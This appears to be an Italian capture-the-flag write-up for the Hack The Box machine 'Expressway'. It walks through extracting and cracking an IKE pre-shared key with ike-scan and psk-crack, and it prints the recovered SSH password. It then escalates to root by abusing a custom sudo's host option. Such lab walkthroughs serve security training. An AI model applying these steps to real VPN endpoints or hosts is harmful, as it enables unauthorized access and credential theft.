# Hackthebox: Expressway
https://app.hackthebox.com/machines/Expressway

## 1. Scan iniziale
Come sempre, ho iniziato con uno scan Nmap di base sulle porte TCP.
```
sudo nmap -sV -sC 10.10.11.87

```
Lo scan ha rivelato solo la porta 22 (SSH) aperta. Troppo poco per iniziare.
## 2. Scan porta 500 (IKE/ VPN)

La porta **UDP 500** Ã¨ la porta standard utilizzata dal protocollo ike (internet key exchange ) per stabilire le connessioni VPN

```
sudo ike-scan -M -A 10.10.11.87
```
- M: Formatta l'output su piÃ¹ righe , rendendolo piÃ¹ leggibile.

- A: Tenta la "ModalitÃ  Aggressiva" .
## 3.Â  `ike-scan --pskcrack`

## 1. Scopo del Comando

Il comando `ike-scan --pskcrack [IP]` Ã¨ usato per **estrarre l'hash della Pre-Shared Key (PSK)** da un server VPN (porta UDP 500) che Ã¨ configurato in modo vulnerabile.

Non cracca la password, ma **recupera l'hash** necessario per craccarla offline.

### 2. Spiegazione delle Opzioni

| Parte | Significato | Funzione |
| :--- | :--- | :--- |
| **`ike-scan`** | Lo strumento | Il tool specializzato per interrogare la porta UDP 500 (IKE). |
| **`--pskcrack`** | L'Opzione (Flag) | Dice a `ike-scan` di tentare una connessione in **"Aggressive Mode"** (ModalitÃ  Aggressiva). |

### 3. Come Funziona l'Attacco

1.Â  Il comando invia una richiesta in "Aggressive Mode" al server VPN.
2.Â  Un server configurato in modo insicuroÂ  risponde inviando dati di autenticazione, inclusa una stringa che Ã¨ l'**hash della password (PSK)**.
3.Â  L'output del comando mostrerÃ  questo hash.

### 4. Crack dell'Hash

1.Â  **Salvare l'Hash:** L'hash trovato nell'output viene copiato e incollato in un file (es. `hash.txt`).
2.Â  **Craccare l'Hash:** Si usa un altro strumento (come `psk-crack` ) per trovare la password in chiaro usando una wordlist (es. `rockyou.txt`).

```shell
# 1. Ottenere l'hash (l'output va salvato in un file)
ike-scan -M -AÂ  --pskcrack [IP]

# 2. Craccare l'hash (esempio)
psk-crack -d /usr/share/wordlists/rockyou.txt hash.txt
```


## 4. Accesso Iniziale (SSH)

### 1.Â  Trovare le Credenziali
L'accesso iniziale alla macchina Expressway avviene tramite SSH (porta 22), ma le credenziali vengono scoperte analizzando e craccando il servizio IKE (porta UDP 500).

* **Scansione IKE (`ike-scan -M -A [IP]`):** Rivela il nome utente (es. `ike@expressway.htb`).
* **Cracking IKE (`psk-crack`):** Rivela la password (la chiave PSK) dopo aver craccato l'hash con una wordlist (es. `rockyou.txt`).

### 2. Credenziali Ottenute
* **Username:** `ike`
* **Password:** `freakingrockstarontheroad`

### 3. Comando di Accesso SSH
Una volta ottenuti username e password, l'accesso si effettua con un normale comando SSH.

```bash
ssh ike@[IP_DELLA_MACCHINA]
```

### 4. Flag user.txt
```
cat user.txt
```

## 5. Privilage Excalation

Dopo aver ottenuto l'accesso come utente `ike` tramite SSH, l'obiettivo Ã¨ diventare `root`.

### 1. Enumerazione InizialeÂ 

Il primo comando da lanciare Ã¨ sempre `sudo -l` per vedere quali comandi possiamo eseguire come root.

```bash
ike@expressway:~$ sudo -l
```


```
ike@expressway:~$ which sudo
/usr/local/bin/sudo
```
Questo conferma che stiamo usando un file sudo non standard (quello normale Ã¨ in /usr/bin/sudo). Questo sudo personalizzato Ã¨ il nostro percorso di attacco

### 2. Enumerazine dei gruppi e log

```
ike@expressway:~$ id
uid=1000(ike) gid=1000(ike) groups=1000(ike),1001(proxy)
```
**Apparteniamo al gruppo proxy.**

Visto che siamo nel gruppo proxy, abbiamo i permessi per leggere i file di log del servizio proxy (come Squid).
```
ike@expressway:~$ ls -l /var/log/squid/
ike@expressway:~$ cat /var/log/squid/access.log.1
```

## 6. Richiesta di una shell fingendo di essere un altro host
```
ike@expressway:~$ sudo -h offramp.expressway.htb /bin/bash
```

## 7. root flag

### 1. Verifica di essere root
```
root@expressway:~# whoami
root
```
### 2. flag root.txt
```
root@expressway:~# cd /root
root@expressway:~# ls
root.txt
root@expressway:~# cat root.txt
```
